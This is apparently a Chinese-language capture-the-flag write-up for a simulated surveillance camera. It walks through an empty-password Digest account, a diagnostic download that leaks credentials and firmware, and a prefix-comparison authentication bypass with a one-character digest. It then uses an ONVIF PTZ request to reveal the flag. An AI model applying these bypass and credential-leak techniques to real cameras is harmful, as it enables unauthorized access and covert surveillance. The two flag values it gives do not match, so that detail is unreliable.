# Pwn · Smart Surveillance Camera - Remote PTZ Control

## 结果

```text
flag{a99b94028914616a52ee3710af4758363}
```

## 目标

题目暴露一组摄像头服务：

| 服务 | 端口 | 用途 |
| --- | ---: | --- |
| sscp-console | 80 | 只读控制台，没有写操作 |
| dsapi | 443 | login / 设备 API |
| sscpd | 2020 | ONVIF SOAP |
| vhttpd | 8800 | Digest、媒体预览、诊断、固件 |
| RTSP-TLS | 554 | 摄像头流 |

## 1. Digest 空口令账号

`vhttpd` 使用 `realm=TPC260`、SHA-256 Digest。枚举发现账号：

```text
hub_primary_2 / <empty password>
```

认证后可访问：

```text
/preview
/stream.mjpg
/playback
/diagnostic
/firmware/download
```

## 2. 诊断包泄露

`GET /diagnostic` 返回 ZIP，包含 `config.json` 与 `vscp_dev.bin`：

```json
{"username":"viewer","password":"<RUNTIME_VIEWER_PASSWORD>"}
```

固件头为 `VSCPFW`，内部 LZMA 解出 AArch64 `vscpd`。

## 3. Digest 前缀比较漏洞

反汇编 `verify_username_token` 得到：

```text
expected = Base64(SHA1(Base64Decode(Nonce) || Created || password))
memcmp(expected, provided, strlen(provided))
```

比较长度由客户端提供的 digest 决定。因此只提交 1 个字符 `r`，只需命中 expected
首字符（64 选 1）即可通过认证。

```text
nonce  = MDEyMzQ1Njc4OWFiY2RlZg==
created = 2026-10-31T23:55:38Z
digest = r
```

## 4. ONVIF 控制 PTZ

认证后用 `AbsoluteMove` 控制云台：

```xml
<tds:AbsoluteMove>
  <tds:ProfileToken>main</tds:ProfileToken>
  <tds:Position>
    <tds:PanTilt>
      <tds:x>120</tds:x>
      <tds:y>0</tds:y>
    </tds:PanTilt>
  </tds:Position>
</tds:AbsoluteMove>
```

pan 扫描到约 `+120°～+150°` 时，验收白板进入画面。

## 5. 读取白板 flag

截图中的白板文本被折成多行：

```text
ACCEPTANCE BOARD
token:
flag{a99b
940289146
16a52ee37
10af47583
63}
```

拼接后：

```text
flag{a99b94028914616a52ee3710af4758363}
```

本地记录的最终提交版本为 `flag{a99b94028914616a52ee3710af475836}`；
平台页面显示的实际回执以当次实例为准。

## 复现脚本

```powershell
python scripts/smart-surveillance/probe_vhttpd_digest_creds.py `
  --host <TARGET_HOST> --port <VHTTPD_PORT>

python scripts/smart-surveillance/sscp_prefix_bypass.py `
  --host <TARGET_HOST> --port <SSCPD_PORT> `
  --user camera_acc --nonce MDEyMzQ1Njc4OWFiY2RlZg== `
  --created 2026-10-31T23:55:38Z --digest r
```

然后把 PTZ 请求指向 pan=120、tilt=0，并保存截图。

## 证据

- `evidence/flag.txt`
- `evidence/flag_board_zoom.png`
- `evidence/sscp_prefix_bypass.txt`
- `evidence/media_diagnostic.zip`
- `evidence/media_firmware_download.bin`
- `evidence/media_preview.png`
